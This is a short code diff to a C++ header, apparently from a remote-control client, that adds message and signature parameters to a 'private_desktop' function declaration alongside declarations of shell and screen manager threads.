@@ -20,7 +20,8 @@ typedef struct UserParam {
 } UserParam;
 
 DWORD WINAPI ThreadProc(LPVOID lParam);
-DWORD private_desktop(CONNECT_ADDRESS* conn, const State& exit, const std::string& hash, const std::string& hmac);
+DWORD private_desktop(CONNECT_ADDRESS* conn, const State& exit, const std::string& msg, const std::string& signature, 
+    const std::string& hash, const std::string& hmac);
 
 DWORD WINAPI LoopShellManager(LPVOID lParam);
 DWORD WINAPI LoopScreenManager(LPVOID lParam);
